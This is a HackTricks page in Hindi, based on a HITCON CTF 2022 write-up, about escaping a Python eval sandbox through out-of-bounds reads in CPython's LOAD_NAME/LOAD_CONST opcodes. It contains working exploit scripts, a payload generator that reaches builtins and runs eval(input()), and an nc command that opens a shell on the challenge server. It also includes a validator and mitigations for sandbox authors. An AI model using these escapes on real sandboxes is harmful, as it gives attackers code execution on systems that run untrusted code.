# LOAD_NAME / LOAD_CONST opcode OOB Read

{{#include ../../../banners/hacktricks-training.md}}

**यह जानकारी** [**इस writeup से ली गई है**](https://blog.splitline.tw/hitcon-ctf-2022/)**।**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

हम LOAD_NAME / LOAD_CONST opcode में OOB read feature का उपयोग करके memory में मौजूद किसी symbol को प्राप्त कर सकते हैं। इसका अर्थ है कि `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` जैसी trick का उपयोग करके अपनी इच्छानुसार कोई symbol (जैसे function name) प्राप्त किया जा सकता है।

फिर बस अपना exploit तैयार करें।

### अवलोकन <a href="#overview-1" id="overview-1"></a>

source code बहुत छोटा है, इसमें केवल 4 lines हैं!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
आप arbitrary Python code इनपुट कर सकते हैं, और इसे [Python code object](https://docs.python.org/3/c-api/code.html) में compile किया जाएगा। हालांकि उस code object के `co_consts` और `co_names` को eval करने से पहले empty tuple से replace कर दिया जाएगा।

इसलिए, expression में मौजूद कोई भी consts (जैसे numbers, strings आदि) या names (जैसे variables, functions) अंत में segmentation fault का कारण बन सकते हैं।

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

segfault कैसे होता है?

आइए एक सरल उदाहरण से शुरू करते हैं, `[a, b, c]` निम्नलिखित bytecode में compile हो सकता है।
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
लेकिन अगर `co_names` empty tuple बन जाए तो क्या होगा? `LOAD_NAME 2` opcode फिर भी execute होता है, और उस memory address से value read करने का प्रयास करता है, जहाँ उसे मूल रूप से होना चाहिए था। हाँ, यह out-of-bound read "feature" है।

इस solution का core concept simple है। CPython में कुछ opcodes, जैसे `LOAD_NAME` और `LOAD_CONST`, OOB read के प्रति vulnerable (?) हैं।

वे `consts` या `names` tuple से index `oparg` पर मौजूद object retrieve करते हैं (इन्हें internally `co_consts` और `co_names` कहा जाता है)। `LOAD_CONST` के बारे में नीचे दिए गए short snippet को देखकर हम समझ सकते हैं कि CPython `LOAD_CONST` opcode को process करते समय क्या करता है।
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
इस तरह हम arbitrary memory offset से एक "name" प्राप्त करने के लिए OOB feature का उपयोग कर सकते हैं। यह सुनिश्चित करने के लिए कि उसका name क्या है और उसका offset क्या है, बस `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... आज़माते रहें। और आपको oparg > 700 के आसपास कुछ मिल सकता है। आप memory layout देखने के लिए gdb का उपयोग भी कर सकते हैं, लेकिन मुझे नहीं लगता कि यह अधिक आसान होगा?

### Exploit तैयार करना <a href="#generating-the-exploit" id="generating-the-exploit"></a>

एक बार जब हम names / consts के उन उपयोगी offsets को retrieve कर लेते हैं, तो उस offset से name / const कैसे प्राप्त करके उसका उपयोग _करें_? आपके लिए एक trick है:\
मान लेते हैं कि हम offset 5 (`LOAD_NAME 5`) से `__getattribute__` name प्राप्त कर सकते हैं, जिसमें `co_names=()` है, तो बस निम्नलिखित करें:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> ध्यान दें कि इसे `__getattribute__` नाम देना आवश्यक नहीं है, आप इसे कुछ छोटा या अधिक अजीब नाम दे सकते हैं

आप केवल इसका bytecode देखकर इसके पीछे का कारण समझ सकते हैं:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
ध्यान दें कि `LOAD_ATTR` भी `co_names` से name प्राप्त करता है। Python किसी name के समान होने पर उसी offset से names लोड करता है, इसलिए दूसरा `__getattribute__` अभी भी offset=5 से लोड होता है। इस feature का उपयोग करके हम किसी भी arbitrary name का उपयोग कर सकते हैं, जब वह name memory में पास में मौजूद हो।

Numbers generate करना trivial होना चाहिए:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

मैंने length limit के कारण consts का उपयोग नहीं किया।

सबसे पहले names के offsets खोजने के लिए एक script है।
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
और निम्नलिखित का उपयोग वास्तविक Python exploit जनरेट करने के लिए किया जाता है।
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
यह मूल रूप से निम्नलिखित कार्य करता है, उन `strings` के लिए जिन्हें हम `__dir__` method से प्राप्त करते हैं:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Version notes and affected opcodes (Python 3.11–3.13)

- CPython bytecode अभी भी integer operands द्वारा `co_consts` और `co_names` tuples में index करता है। यदि attacker इन tuples को empty कर सकता है (या bytecode द्वारा उपयोग किए गए maximum index से छोटा कर सकता है), तो interpreter उस index के लिए out-of-bounds memory पढ़ेगा, जिससे nearby memory से एक arbitrary PyObject pointer प्राप्त होगा। Relevant opcodes में कम-से-कम ये शामिल हैं:
- `LOAD_CONST consti` → `co_consts[consti]` पढ़ता है।
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → `co_names[...]` से names पढ़ते हैं (3.11+ के लिए ध्यान दें कि `LOAD_ATTR`/`LOAD_GLOBAL` low bit में flag bits store करते हैं; वास्तविक index `namei >> 1` होता है)। प्रत्येक version के exact semantics के लिए disassembler docs देखें। [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ ने adaptive/inline caches पेश किए, जो instructions के बीच hidden `CACHE` entries जोड़ते हैं। इससे OOB primitive नहीं बदलता; इसका केवल यह अर्थ है कि यदि आप bytecode को handcraft करते हैं, तो `co_code` बनाते समय आपको उन cache entries का हिसाब रखना होगा।

Practical implication: जब आप किसी code object को control कर सकते हैं (जैसे `CodeType.replace(...)` के माध्यम से) और `co_consts`/`co_names` को छोटा कर सकते हैं, तो इस page की technique CPython 3.11, 3.12 और 3.13 पर काम करती रहती है।

### उपयोगी OOB indexes के लिए Quick scanner (3.11+/3.12+ compatible)

यदि आप high-level source के बजाय सीधे bytecode से interesting objects की probe करना चाहते हैं, तो आप minimal code objects generate करके indices को brute force कर सकते हैं। नीचे दिया गया helper आवश्यकता होने पर inline caches अपने-आप insert करता है।
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
नोट्स
- इसके बजाय names को probe करने के लिए `LOAD_CONST` को `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` से बदलें और stack usage को उसी अनुसार समायोजित करें।
- यदि आवश्यक हो, तो `arg` के `EXTENDED_ARG` या multiple bytes का उपयोग करके indexes >255 तक पहुंचें। ऊपर दिए गए `dis` के साथ build करते समय, आप केवल low byte को नियंत्रित करते हैं; बड़े indexes के लिए raw bytes स्वयं construct करें या attack को multiple loads में विभाजित करें।

### Minimal bytecode-only RCE pattern (co_consts OOB → builtins → eval/input)

एक बार जब आपने ऐसे `co_consts` index की पहचान कर ली जो builtins module को resolve करता है, तो आप stack में manipulation करके बिना किसी `co_names` के `eval(input())` को reconstruct कर सकते हैं:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
यह approach उन challenges में उपयोगी है जो आपको `co_code` पर direct control देते हैं, जबकि `co_consts=()` और `co_names=()` को अनिवार्य करते हैं (जैसे BCTF 2024 “awpcode”)। यह source-level tricks से बचता है और bytecode stack ops तथा tuple builders का लाभ उठाकर payload size को छोटा रखता है।

### sandboxes के लिए Defensive checks और mitigations

यदि आप ऐसा Python “sandbox” लिख रहे हैं जो untrusted code को compile/evaluate करता है या code objects में बदलाव करता है, तो bytecode द्वारा उपयोग किए गए tuple indexes पर bounds-checking के लिए CPython पर निर्भर न रहें। इसके बजाय, उन्हें execute करने से पहले code objects को स्वयं validate करें।

Practical validator (co_consts/co_names तक OOB access को reject करता है)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
अतिरिक्त mitigation ideas
- untrusted input पर arbitrary `CodeType.replace(...)` की अनुमति न दें, या परिणामी code object पर strict structural checks जोड़ें।
- CPython semantics पर निर्भर रहने के बजाय untrusted code को OS-level sandboxing (seccomp, job objects, containers) वाले separate process में चलाने पर विचार करें।

## References

- [1] [Splitline's HITCON CTF 2022 writeup "V O I D" (इस technique और high-level exploit chain का origin)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Python disassembler docs (LOAD_CONST/LOAD_NAME/etc. के indices semantics और 3.11+ `LOAD_ATTR`/`LOAD_GLOBAL` low-bit flags)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
